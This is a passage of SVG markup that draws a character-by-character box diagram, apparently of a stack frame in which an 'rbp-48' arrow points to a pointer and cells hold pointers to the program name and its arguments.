<text text-anchor='middle' x='48' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='48' y='228' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='56' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='56' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='64' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='116' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='120' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='120' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='120' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='120' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='196' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='216' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='228' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='116' fill='currentColor' style='font-size:1em'>►</text>
<text text-anchor='middle' x='384' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='392' y='116' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='408' y='116' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='416' y='116' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='424' y='116' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='448' y='36' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='448' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='68' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='100' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='132' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='164' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='196' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='292' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='324' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='356' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='388' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='420' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='448' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='448' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='456' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='464' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='308' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='464' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='472' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='308' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='472' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='340' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='472' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='372' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='472' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='404' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='472' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='116' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='480' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='480' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='340' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='480' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='372' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='480' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='404' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='480' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='488' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='308' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='488' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='340' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='488' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='488' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='404' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='488' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='116' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='496' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='308' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='496' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='340' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='496' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='372' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='496' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='404' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='496' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='504' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='308' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='504' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='340' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='504' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='372' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='504' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='404' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='504' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='512' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='308' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='512' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='340' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='512' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='372' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='512' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='404' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='512' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='116' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='520' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='308' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='520' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='340' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='520' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='372' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='520' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='404' fill='currentColor' style='font-size:1em'>+</text>
<text text-anchor='middle' x='520' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='528' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='308' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='528' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='340' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='528' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='372' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='528' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='404' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='528' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='116' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='536' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='308' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='536' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='340' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='536' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='372' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='536' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='404' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='536' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='544' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='308' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='544' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='340' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='544' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='372' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='544' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='404' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='544' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='552' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='308' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='552' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='340' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='552' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='372' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='552' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='404' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='552' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='116' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='560' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='308' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='560' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='116' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='568' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='308' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='568' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='116' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='576' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='164' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='196' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='308' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='576' y='324' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='388' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='116' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='584' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='164' fill='currentColor' style='font-size:1em'>─</text>
